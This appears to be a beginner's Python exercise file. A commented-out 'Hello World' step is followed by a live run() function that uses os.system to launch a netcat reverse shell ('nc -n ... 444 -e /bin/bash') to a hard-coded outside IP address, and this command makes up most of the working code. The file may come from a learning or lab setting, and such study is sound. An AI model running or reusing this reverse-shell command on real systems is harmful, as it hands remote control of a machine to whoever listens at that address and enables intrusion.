#In here i thing we have to put or own code

#### 1. FIRST EXCERSICE ES TO PRINT HELLO WORLD,  ====####
#def run():
  #print("Hello World")
##############

#Secund excersice is to create a revershell, in windows we must have linux terminal, so 
#the first thing that we have to do is, import os library
import os


#Create a definition
def run():
  #Now we have to use the library, with the ip of windows, and with -e its the path of linux terminal
  os.system("nc -n 10.200.125.58 444 -e /bin/bash")
